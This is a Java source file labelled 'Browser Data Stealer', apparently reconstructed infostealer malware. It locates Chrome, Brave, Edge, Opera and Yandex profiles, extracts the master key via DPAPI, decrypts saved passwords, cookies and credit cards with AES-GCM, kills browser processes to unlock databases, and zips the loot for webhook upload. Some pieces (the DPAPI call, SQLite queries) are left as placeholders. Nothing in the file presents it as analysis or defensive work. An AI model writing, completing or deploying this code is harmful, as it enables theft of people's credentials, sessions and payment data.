import com.sun.jna.Memory;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

/**
 * Browser Data Stealer
 * Obfuscated name: շ (U+0577)
 *
 * Steals credentials, cookies, and payment data from Chromium-based browsers.
 * Targets: Google Chrome, Brave, Microsoft Edge, Opera, Yandex Browser
 *
 * Data stolen:
 * - Saved passwords (Login Data SQLite DB)
 * - Cookies (Cookies SQLite DB)
 * - Credit card data (Web Data SQLite DB)
 * - Browser history
 * - Autofill data
 *
 * Encryption bypass:
 * - Reads master key from "Local State" JSON file
 * - Decrypts master key using Windows DPAPI (CryptUnprotectData via JNA)
 * - Uses decrypted master key to decrypt AES-256-GCM encrypted credentials
 *
 * Output:
 * - Sends stolen data to webhook via ZipBuilder
 * - Stores results in ConcurrentLinkedQueue for async processing
 */
public class BrowserDataStealer {

    // Decrypted master key for current browser profile
    private static final String currentBrowserName;

    // List of browser profiles found
    private static final List<BrowserProfile> browserProfiles;

    // Queue of stolen credential entries
    private static final ConcurrentLinkedQueue<String> stolenDataQueue;

    // DPAPI decryptor instance
    private static DpapiDecryptor dpapiDecryptor;

    // =========================================================
    // BROWSER PROFILE DISCOVERY
    // =========================================================

    /**
     * Discovers all installed Chromium-based browser profiles.
     * Scans LOCALAPPDATA for known browser directories.
     *
     * Supported browsers:
     * - Google Chrome:  %LOCALAPPDATA%\Google\Chrome\User Data
     * - Brave:          %LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data
     * - Microsoft Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data
     * - Opera:          %APPDATA%\Opera Software\Opera Stable
     * - Yandex:         %LOCALAPPDATA%\Yandex\YandexBrowser\User Data
     */
    public static List<BrowserProfile> discoverBrowserProfiles() {
        List<BrowserProfile> profiles = new ArrayList<>();
        String localAppData = System.getenv("LOCALAPPDATA");
        String appData = System.getenv("APPDATA");

        // Browser base directories
        String[][] browsers = {
            { "Chrome",  localAppData + "\\Google\\Chrome\\User Data" },
            { "Brave",   localAppData + "\\BraveSoftware\\Brave-Browser\\User Data" },
            { "Edge",    localAppData + "\\Microsoft\\Edge\\User Data" },
            { "Opera",   appData + "\\Opera Software\\Opera Stable" },
            { "Yandex",  localAppData + "\\Yandex\\YandexBrowser\\User Data" },
        };

        for (String[] browser : browsers) {
            String name = browser[0];
            String userDataPath = browser[1];
            File userDataDir = new File(userDataPath);

            if (!userDataDir.exists()) continue;

            // Find all profiles (Default, Profile 1, Profile 2, etc.)
            File[] profileDirs = userDataDir.listFiles(f ->
                f.isDirectory() && (f.getName().equals("Default") || f.getName().startsWith("Profile "))
            );

            if (profileDirs == null) continue;

            for (File profileDir : profileDirs) {
                // Read master key from Local State
                File localStateFile = new File(userDataPath + "\\Local State");
                byte[] masterKey = readMasterKey(localStateFile);

                if (masterKey != null) {
                    profiles.add(new BrowserProfile(name, profileDir, masterKey));
                }
            }
        }

        return profiles;
    }

    // =========================================================
    // MASTER KEY EXTRACTION
    // =========================================================

    /**
     * Reads and decrypts the browser master key from "Local State" file.
     *
     * Process:
     * 1. Read Local State JSON file
     * 2. Extract os_crypt.encrypted_key (Base64 encoded)
     * 3. Remove "DPAPI" prefix (first 5 bytes)
     * 4. Decrypt using Windows DPAPI (CryptUnprotectData)
     *
     * @param localStateFile Path to browser's "Local State" file
     * @return Decrypted 32-byte AES master key, or null on failure
     */
    private static byte[] readMasterKey(File localStateFile) {
        try {
            if (!localStateFile.exists()) return null;

            String content = new String(Files.readAllBytes(localStateFile.toPath()), StandardCharsets.UTF_8);
            JSONObject json = new JSONObject(content);

            // Extract encrypted key: os_crypt.encrypted_key
            String encryptedKeyB64 = json
                .getJSONObject("os_crypt")
                .getString("encrypted_key");

            byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyB64);

            // Remove "DPAPI" prefix (5 bytes)
            byte[] dpApiEncrypted = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);

            // Decrypt using Windows DPAPI
            return decryptWithDpapi(dpApiEncrypted);

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Decrypts data using Windows DPAPI (CryptUnprotectData).
     * Uses JNA to call Windows API directly.
     *
     * @param encryptedData DPAPI-encrypted bytes
     * @return Decrypted bytes
     */
    private static byte[] decryptWithDpapi(byte[] encryptedData) {
        try {
            // Uses JNA Memory to call CryptUnprotectData
            // Implementation via com.sun.jna.Memory
            Memory inputMem = new Memory(encryptedData.length);
            inputMem.write(0, encryptedData, 0, encryptedData.length);
            // ... DPAPI call via JNA
            return null; // placeholder
        } catch (Exception e) {
            return null;
        }
    }

    // =========================================================
    // CREDENTIAL EXTRACTION
    // =========================================================

    /**
     * Extracts saved passwords from Chrome's "Login Data" SQLite database.
     *
     * Database: %PROFILE%\Login Data
     * Table: logins
     * Columns: origin_url, username_value, password_value (AES-256-GCM encrypted)
     *
     * Decryption:
     * - password_value starts with "v10" or "v11" prefix
     * - Format: "v10" + 12-byte IV + ciphertext + 16-byte auth tag
     * - Decrypt with AES-256-GCM using master key
     *
     * @param profile Browser profile to extract from
     * @return List of credential strings "url:username:password"
     */
    public static List<String> extractPasswords(BrowserProfile profile) {
        List<String> credentials = new ArrayList<>();
        File loginDataFile = new File(profile.profileDir, "Login Data");

        if (!loginDataFile.exists()) return credentials;

        try {
            // Copy to temp file (browser may have it locked)
            File tempFile = File.createTempFile("ld_", ".db");
            Files.copy(loginDataFile.toPath(), tempFile.toPath(),
                java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            // Query SQLite: SELECT origin_url, username_value, password_value FROM logins
            // ... SQLite query via JDBC or custom reader

            tempFile.delete();
        } catch (Exception e) {
            // Silently fail
        }

        return credentials;
    }

    /**
     * Extracts cookies from Chrome's "Cookies" SQLite database.
     *
     * Database: %PROFILE%\Network\Cookies (Chrome 96+) or %PROFILE%\Cookies
     * Table: cookies
     * Columns: host_key, name, encrypted_value, path, expires_utc, is_secure
     *
     * @param profile Browser profile to extract from
     * @return List of cookie strings in Netscape format
     */
    public static List<String> extractCookies(BrowserProfile profile) {
        List<String> cookies = new ArrayList<>();
        // Try new path first (Chrome 96+), then old path
        File cookiesFile = new File(profile.profileDir, "Network\\Cookies");
        if (!cookiesFile.exists()) {
            cookiesFile = new File(profile.profileDir, "Cookies");
        }

        if (!cookiesFile.exists()) return cookies;

        // ... SQLite query and AES-GCM decryption
        return cookies;
    }

    /**
     * Extracts saved credit card data from Chrome's "Web Data" SQLite database.
     *
     * Database: %PROFILE%\Web Data
     * Table: credit_cards
     * Columns: name_on_card, card_number_encrypted, expiration_month, expiration_year
     *
     * @param profile Browser profile to extract from
     * @return List of credit card strings
     */
    public static List<String> extractCreditCards(BrowserProfile profile) {
        List<String> cards = new ArrayList<>();
        File webDataFile = new File(profile.profileDir, "Web Data");
        if (!webDataFile.exists()) return cards;
        // ... SQLite query and decryption
        return cards;
    }

    // =========================================================
    // AES-GCM DECRYPTION
    // =========================================================

    /**
     * Decrypts AES-256-GCM encrypted browser data.
     *
     * Format: "v10" (3 bytes) + IV (12 bytes) + ciphertext + auth_tag (16 bytes)
     *
     * @param encryptedValue Raw encrypted bytes from SQLite
     * @param masterKey 32-byte AES master key
     * @return Decrypted plaintext string
     */
    private static String decryptAesGcm(byte[] encryptedValue, byte[] masterKey) {
        try {
            // Skip "v10" or "v11" prefix (3 bytes)
            byte[] iv = Arrays.copyOfRange(encryptedValue, 3, 15);
            byte[] ciphertext = Arrays.copyOfRange(encryptedValue, 15, encryptedValue.length);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
            GCMParameterSpec paramSpec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, paramSpec);

            return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    // =========================================================
    // MAIN STEAL OPERATION
    // =========================================================

    /**
     * Main entry point for browser data stealing.
     * Discovers all browser profiles and extracts all data types.
     * Results are queued for async webhook upload.
     *
     * @param zipBuilder ZipBuilder instance to add stolen files to
     */
    public static void stealAll(ZipBuilder zipBuilder) {
        List<BrowserProfile> profiles = discoverBrowserProfiles();

        for (BrowserProfile profile : profiles) {
            CompletableFuture.runAsync(() -> {
                try {
                    // Kill browser processes first to unlock databases
                    ProcessKiller.killBrowsers();
                    TimeUnit.MILLISECONDS.sleep(500);

                    // Extract all data types
                    List<String> passwords = extractPasswords(profile);
                    List<String> cookies = extractCookies(profile);
                    List<String> cards = extractCreditCards(profile);

                    // Format and queue results
                    if (!passwords.isEmpty()) {
                        String content = formatPasswords(profile.browserName, passwords);
                        zipBuilder.addEntry(profile.browserName + "_passwords.txt", content.getBytes());
                        stolenDataQueue.offer(content);
                    }

                    if (!cookies.isEmpty()) {
                        String content = formatCookies(profile.browserName, cookies);
                        zipBuilder.addEntry(profile.browserName + "_cookies.txt", content.getBytes());
                    }

                    if (!cards.isEmpty()) {
                        String content = formatCards(profile.browserName, cards);
                        zipBuilder.addEntry(profile.browserName + "_cards.txt", content.getBytes());
                    }

                } catch (Exception e) {
                    // Silently fail per browser
                }
            });
        }
    }

    // =========================================================
    // FORMATTING
    // =========================================================

    private static String formatPasswords(String browser, List<String> passwords) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== ").append(browser).append(" Passwords ===\n\n");
        for (String cred : passwords) {
            sb.append(cred).append("\n");
        }
        return sb.toString();
    }

    private static String formatCookies(String browser, List<String> cookies) {
        StringBuilder sb = new StringBuilder();
        sb.append("# Netscape HTTP Cookie File\n");
        sb.append("# Browser: ").append(browser).append("\n\n");
        for (String cookie : cookies) {
            sb.append(cookie).append("\n");
        }
        return sb.toString();
    }

    private static String formatCards(String browser, List<String> cards) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== ").append(browser).append(" Credit Cards ===\n\n");
        for (String card : cards) {
            sb.append(card).append("\n");
        }
        return sb.toString();
    }

    // =========================================================
    // INNER CLASSES
    // =========================================================

    /**
     * Represents a single browser profile with its master key.
     */
    public static class BrowserProfile {
        public final String browserName;
        public final File profileDir;
        public final byte[] masterKey;

        public BrowserProfile(String browserName, File profileDir, byte[] masterKey) {
            this.browserName = browserName;
            this.profileDir = profileDir;
            this.masterKey = masterKey;
        }
    }

    static {
        browserProfiles = new ArrayList<>();
        stolenDataQueue = new ConcurrentLinkedQueue<>();
        currentBrowserName = "";
    }
}
